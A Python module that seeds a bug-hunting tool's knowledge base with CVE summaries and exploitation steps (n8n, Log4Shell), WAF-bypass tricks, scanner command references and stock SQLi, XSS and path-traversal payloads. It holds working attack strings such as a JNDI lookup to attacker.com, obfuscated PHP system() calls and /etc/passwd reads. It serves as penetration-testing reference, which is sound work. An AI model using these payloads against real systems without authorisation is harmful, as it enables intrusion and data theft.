"""Bug Hunter Knowledge Updater -- update and seed the knowledge base."""

from __future__ import annotations

from bughunter.kb.store import KnowledgeStore


def seed_knowledge_base(store: KnowledgeStore) -> None:
    """Seed the knowledge base with initial data.

    This populates the KB with essential security knowledge including
    CVEs, bypass techniques, tool guides, and common payloads.
    """
    # -- CVE Entries --

    cves = [
        {
            "id": "CVE-2026-21858",
            "title": "n8n Arbitrary File Read via Public Form",
            "description": (
                "n8n versions >= 1.65.0 and < 1.121.0 allow unauthenticated "
                "arbitrary file read through public form submission endpoints."
            ),
            "severity": "Critical",
            "affected": "n8n >= 1.65.0, < 1.121.0",
            "tags": ["n8n", "file-read", "rce", "critical"],
            "exploitation_steps": [
                "Identify a public form path on the n8n instance",
                "Send POST request with forged files object containing filepath",
                "Read server files including /etc/passwd, config, database",
                "Extract encryption key from config",
                "Use extracted credentials to login",
                "Create malicious workflow with expression injection for RCE",
            ],
            "remediation": "Upgrade to n8n >= 1.121.0",
        },
        {
            "id": "CVE-2025-68613",
            "title": "n8n Authenticated Expression Injection RCE",
            "description": (
                "Authenticated expression injection in n8n allows RCE via "
                "malicious workflow expressions."
            ),
            "severity": "Critical",
            "affected": "n8n >= 0.211.0, < 1.120.4",
            "tags": ["n8n", "rce", "expression-injection", "critical"],
            "exploitation_steps": [
                "Login with valid credentials",
                "Create a workflow with manualTrigger + set node",
                "Insert expression payload",
                "Run the workflow",
                "Read execution result for command output",
            ],
            "remediation": "Upgrade to n8n >= 1.120.4 or 1.121.1",
        },
        {
            "id": "CVE-2021-44228",
            "title": "Log4j Remote Code Execution (Log4Shell)",
            "description": (
                "Apache Log4j2 <=2.14.1 JNDI features do not protect against "
                "attacker-controlled LDAP and other JNDI related endpoints."
            ),
            "severity": "Critical",
            "affected": "Apache Log4j2 <= 2.14.1",
            "tags": ["log4j", "rce", "jndi", "critical", "java"],
            "exploitation_steps": [
                "Identify Java application with Log4j dependency",
                "Inject ${jndi:ldap://attacker.com/exploit} in user input",
                "Common points: User-Agent, X-Forwarded-For, form fields",
                "Detect with nuclei: nuclei_scan(target=URL, tags='cve,log4j')",
            ],
            "remediation": "Upgrade Log4j to >= 2.17.0",
        },
    ]

    for cve in cves:
        existing = store.get_entry("cve", cve["id"])
        if not existing:
            store.add_entry("cve", cve["id"], cve)

    # -- Technique Entries --

    techniques = [
        {
            "id": "sqli-bypass",
            "title": "SQL Injection Bypass Techniques",
            "description": "Methods to bypass WAF filters for SQL injection payloads",
            "tags": ["sqli", "waf-bypass", "web"],
            "bypass_methods": [
                "Mixed case: SeLeCt, UnIoN",
                "Inline comments: S/*!ELECT*/",
                "Double encoding: %2565",
                "No-space bypass: UNION/**/SELECT",
            ],
        },
        {
            "id": "rce-bypass-php",
            "title": "PHP Command Execution Bypass Techniques",
            "description": "Methods to bypass PHP WAF filters for command execution",
            "tags": ["rce", "waf-bypass", "php", "web"],
            "bypass_methods": [
                "Base64: $f=base64_decode('c3lzdGVt');$f('id');",
                "Concatenation: $f='sys'.'tem';$f('id');",
                "Reversal: $f=strrev('metsys');$f('id');",
                "Backticks: `whoami`",
            ],
        },
        {
            "id": "xss-bypass",
            "title": "XSS Bypass Techniques",
            "description": "Methods to bypass XSS filters and WAF rules",
            "tags": ["xss", "waf-bypass", "web"],
            "bypass_methods": [
                "Event handlers: <img src=x onerror=alert(1)>",
                "SVG tag: <svg onload=alert(1)>",
                "HTML entity encoding",
                "Unicode encoding",
            ],
        },
        {
            "id": "cmd-injection-bypass",
            "title": "Command Injection Bypass Techniques",
            "description": "Methods to bypass command injection filters",
            "tags": ["command-injection", "waf-bypass", "web"],
            "bypass_methods": [
                "Pipe: id|whoami",
                "Variable concatenation: a=i;b=d;$a$b",
                "Wildcards: /bin/ca? /etc/pas?d",
                "$IFS as space: cat${IFS}/etc/passwd",
            ],
        },
        {
            "id": "ssrf-techniques",
            "title": "SSRF Exploitation Techniques",
            "description": "Server-Side Request Forgery attack and bypass methods",
            "tags": ["ssrf", "web", "cloud"],
            "bypass_methods": [
                "IP format bypass: 0x7f000001, 2130706433",
                "URL parser confusion: http://attacker.com@127.0.0.1",
                "DNS rebinding: domain resolves to internal IP after check",
                "Cloud metadata: http://169.254.169.254/latest/meta-data/",
                "IPv6 bypass: http://[::1]/ for localhost",
            ],
        },
    ]

    for tech in techniques:
        existing = store.get_entry("techniques", tech["id"])
        if not existing:
            store.add_entry("techniques", tech["id"], tech)

    # -- Tool Guides --

    tools = [
        {
            "id": "nmap",
            "title": "Nmap Port Scanner Quick Reference",
            "description": "Common Nmap scanning commands and parameters",
            "tags": ["nmap", "recon", "scanning"],
            "commands": [
                "nmap -sV -sC -p- TARGET  # Full port scan + version detection",
                "nmap -sS --top-ports 1000 TARGET  # SYN scan top 1000",
                "nmap --script vuln TARGET  # Vulnerability scripts",
                "nmap -A -T4 TARGET  # Aggressive scan",
            ],
        },
        {
            "id": "nuclei",
            "title": "Nuclei Vulnerability Scanner Guide",
            "description": "Template-based vulnerability scanning with Nuclei",
            "tags": ["nuclei", "scanning", "vulnerability", "cve"],
            "commands": [
                "nuclei_scan(target=URL)  # Default scan",
                "nuclei_scan(target=URL, severity='critical,high')  # High sev only",
                "nuclei_scan(target=URL, templates='cves')  # Known CVEs",
                "nuclei_scan(target=URL, tags='rce,sqli,xss')  # Specific types",
            ],
        },
        {
            "id": "sqlmap",
            "title": "SQLMap SQL Injection Scanner Guide",
            "description": "Automated SQL injection detection and exploitation",
            "tags": ["sqlmap", "sqli", "exploitation", "web"],
            "commands": [
                "sqlmap_scan(url='URL?param=val')  # Basic detection",
                "sqlmap_scan(url=URL, level=3, risk=2)  # Deep scan",
                "sqlmap_scan(url=URL, tamper='space2comment')  # WAF bypass",
            ],
        },
        {
            "id": "ffuf",
            "title": "Ffuf Web Fuzzer Guide",
            "description": "Fast web fuzzing for directories, files, and parameters",
            "tags": ["ffuf", "fuzzing", "enumeration", "web"],
            "commands": [
                "ffuf_fuzz(url='https://target/FUZZ')  # Directory fuzzing",
                "ffuf_fuzz(url=URL, wordlist='big')  # Larger wordlist",
                "ffuf_fuzz(url=URL, filter_code='404,403')  # Filter codes",
            ],
        },
        {
            "id": "dalfox",
            "title": "Dalfox XSS Scanner Guide",
            "description": "Automated XSS detection with Dalfox",
            "tags": ["dalfox", "xss", "scanning", "web"],
            "commands": [
                "xss_scan(url='https://target/search?q=test')  # Basic scan",
                "xss_scan(url=URL, param='q')  # Target specific param",
                "xss_scan(url=URL, blind_url='https://oob.server')  # Blind XSS",
            ],
        },
        {
            "id": "burp",
            "title": "Burp Suite Workflow Guide",
            "description": "Burp Suite penetration testing workflow",
            "tags": ["burp", "proxy", "web"],
            "workflow": [
                "Configure browser proxy to point to Burp",
                "Browse target site to collect requests",
                "Analyze request parameters and endpoints",
                "Use Intruder for fuzzing",
                "Use Repeater for manual verification",
            ],
        },
    ]

    for tool in tools:
        existing = store.get_entry("tools", tool["id"])
        if not existing:
            store.add_entry("tools", tool["id"], tool)

    # -- Payload Entries --

    payloads = [
        {
            "id": "sqli-common",
            "title": "Common SQL Injection Payloads",
            "description": "Frequently used SQL injection test payloads",
            "tags": ["sqli", "payloads", "web"],
            "payloads": [
                "' OR 1=1--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' AND SLEEP(5)--",
            ],
        },
        {
            "id": "xss-common",
            "title": "Common XSS Payloads",
            "description": "Frequently used XSS test payloads",
            "tags": ["xss", "payloads", "web"],
            "payloads": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
            ],
        },
        {
            "id": "lfi-common",
            "title": "Common LFI/Path Traversal Payloads",
            "description": "Local File Inclusion and path traversal payloads",
            "tags": ["lfi", "path-traversal", "payloads", "web"],
            "payloads": [
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
            ],
        },
    ]

    for payload in payloads:
        existing = store.get_entry("payloads", payload["id"])
        if not existing:
            store.add_entry("payloads", payload["id"], payload)
